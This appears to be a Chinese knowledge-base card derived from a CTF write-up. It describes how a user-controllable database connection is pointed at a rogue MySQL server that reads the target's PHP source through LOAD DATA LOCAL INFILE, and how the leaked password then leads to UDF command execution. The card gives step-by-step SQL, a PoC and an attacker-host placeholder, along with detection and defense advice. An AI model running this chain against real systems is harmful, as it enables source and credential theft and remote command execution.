---
id: web-generic-sqli-db-endpoint-controllable-rogue-mysql-source-read-udf
title: 数据库连接地址可控：rogue MySQL 服务端读目标源码拿密码，再连真实库 UDF 提权执行命令
type: scenario
domain: web
path: web/generic/sqli
technique: db-endpoint-controllable-rogue-mysql-source-read-udf
tags:
- mysql
- sqli
- rogue-server
- local-infile
- file-read
- udf
- privilege-escalation
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V568
  verified_at: '2026-11-12T09:16:57+08:00'
  notes: 已对照原文12937及全部21张图逐张核对：图06 通过rogue MySQL回传的query.php源码含 $db_password='1q2w3e4r5t!@#'（卡片示例一致）；图07 执行数据库命令界面 sys_eval('env') 输出含 FLAG=DASCTF{...}；步骤/命令（@@basedir、unhex into dumpfile、create function sys_eval、sys_eval('env')）与原文一致；原文将plugin路径写作/usr/lib/mysql/p1ugin，卡片已在步骤4标注为字符混淆/拼写需按实际plugin_dir，处理正确；0xFB LOAD DATA LOCAL INFILE机制为卡片补充的标准协议解释（原文只写起rogue server读文件），与结果一致。dedup：与防守视角rogue MySQL读攻击者文件卡、MySQL UDF提权卡均非同链（本卡为可控连接→读目标源码拿密码→真实库UDF完整攻击链），无需删除。原文无受影响版本声明，未设versions。
url: /docs/web/generic/sqli/web-generic-sqli-db-endpoint-controllable-rogue-mysql-source-read-udf/
draft: false
kb_aliases:
- 可控数据库地址利用
- rogue MySQL 读服务端文件
- LOAD DATA LOCAL INFILE 读源码
- MySQL UDF sys_eval 提权
- 数据库连接参数可控 CTF
---

## 一句话结论

Web 功能允许用户填写数据库地址、账号、密码并执行 SQL 时，可先把连接指向攻击者控制的恶意 MySQL 服务端：服务端在握手后下发 `LOAD DATA LOCAL INFILE` 请求（0xFB），客户端驱动若允许本地文件读取就会把目标服务器上的任意文件（如 `/var/www/html/query.php`）回传，从而拿到源码中的真实数据库密码；再连真实库确认 `FILE` 权限，用 `INTO DUMPFILE` 写 UDF 并 `CREATE FUNCTION sys_eval` 执行系统命令。

## 原理

- **连接参数可控即身份可控**：应用把用户输入的 `db_host/db_user/db_pass` 传给数据库驱动连接，攻击者让"数据库"指向自己的恶意服务端，应用就会把凭据与后续 SQL 发给攻击者，并由攻击者决定响应内容。
- **MySQL 协议的文件读取方向**：MySQL 支持服务端向客户端请求本地文件（`LOAD DATA LOCAL INFILE`，协议包首字节 0xFB）。客户端驱动（如 PHP mysqli/PDO 开启 `local_infile`、MySQL 命令行默认开启）收到后会把指定路径文件内容上传给服务端——方向与常见"读数据库服务器文件"相反，读的是**客户端（Web 服务器）**的文件。
- **读源码拿凭据**：对目标执行 `LOAD DATA LOCAL INFILE '/var/www/html/query.php'`（由恶意服务端主动下发），回传内容里包含 `$db_password` 等连接真实数据库的凭据。
- **UDF 提权**：用真实凭据连接后，若数据库用户有 `FILE` 权限且 `secure_file_priv` 允许，`SELECT @@basedir` 找 plugin 目录，`SELECT unhex('...') INTO DUMPFILE '//usr/lib/mysql/plugin/udf.so'` 写入 UDF 库，`CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so'` 注册，`SELECT sys_eval("env")` 执行系统命令；CTF 中 flag 常在环境变量里。
- **为什么成立**：MySQL 协议把"读客户端文件"设计为服务端可请求的合法操作，驱动默认允许；UDF 机制允许加载任意共享库并执行其函数。

## 触发条件

- Web 应用提供"自定义数据库连接并执行 SQL"的功能（查询工具、数据库管理面板、CTF 题目）；
- 目标 PHP/驱动开启 `local_infile`（mysqli 默认跟随 `local_infile`；PDO 需 `MYSQL_ATTR_LOCAL_INFILE`）；
- 目标数据库用户具备 `FILE` 权限、`secure_file_priv` 为空或指向可写目录，plugin 目录可写；
- 攻击者可让目标访问自己的 MySQL 端口。

## 利用步骤

1. 在功能里填自己的 MySQL 地址（如 `ATTACKER:3306`）与任意账号密码，起 Rogue-MySql-Server 类工具。
2. 服务端在认证后主动下发 `LOAD DATA LOCAL INFILE '/var/www/html/query.php'`，读取客户端回传，得到源码与真实数据库密码（如 `1q2w3e4r5t!@#`）。
3. 用真实凭据连接真实数据库，确认权限：`select @@basedir`、`select @@secure_file_priv`、`show grants`。
4. 找 plugin 目录（如 `/usr/lib/mysql/p1ugin`——原文路径有字符混淆/拼写，需按实际 `plugin_dir`），把 UDF so 的 hex 用 `SELECT unhex('...') INTO DUMPFILE '<plugin_dir>/udf.so'` 写入。
5. `CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';` 注册函数。
6. `SELECT sys_eval("env");` 执行命令并读取环境变量中的 flag。

## PoC

```sql
-- 1) 读源码（由恶意 MySQL 服务端下发 LOAD DATA LOCAL INFILE，客户端回传文件内容）
LOAD DATA LOCAL INFILE '/var/www/html/query.php' INTO TABLE x;

-- 2) 连真实库后 UDF 提权
SELECT @@basedir;
SELECT @@secure_file_priv;
SELECT unhex('7f454c46...') INTO DUMPFILE '//usr/lib/mysql/plugin/udf.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';
SELECT sys_eval("env");
```

```text
# Rogue-MySql-Server 场景：服务端认证成功后发送 0xFB 包
# 包体：LOAD DATA LOCAL INFILE '/var/www/html/query.php' INTO TABLE x
# 客户端 mysqli 回传文件内容，攻击者日志中即得到 query.php 源码
```

## 变体与关联

- 变体：读 Windows 客户端文件（`C:/Windows/win.ini`）、读其他 Web 配置（`config.php`、`.env`）拿凭据；防守反制视角（蜜罐读取攻击者本机文件）见 [[defense-incident-response-mysql-rogue-server-local-infile-client-file-read]]。
- 关联：MySQL UDF 提权细节 [[pentest-privilege-escalation-mysql-udf-dumpfile-root]]；`secure_file_priv` 限制下的其它写入路径（日志、慢查询、general_log）。
- 变体：若目标驱动禁止 LOCAL INFILE，可退回让连接指向内网地址做端口探测/SSRF，或利用 `jdbc:mysql` URL 参数。

## 检测与防御

- 检测：应用日志中出现用户自定义 `db_host` 指向外部地址；出站 3306 连接；`query.php` 等源码被异常读取；数据库端 `CREATE FUNCTION`、`INTO DUMPFILE`、`sys_eval` 调用与 plugin 目录新增 .so。
- 防御：禁止用户自定义数据库连接地址（白名单）；关闭 `local_infile`（`mysqli.options(MYSQLI_OPT_LOCAL_INFILE, false)`/PDO 不开启）；数据库用户最小权限（去掉 FILE）、`secure_file_priv` 指向受控目录；监控 UDF/DUMPFILE 行为。
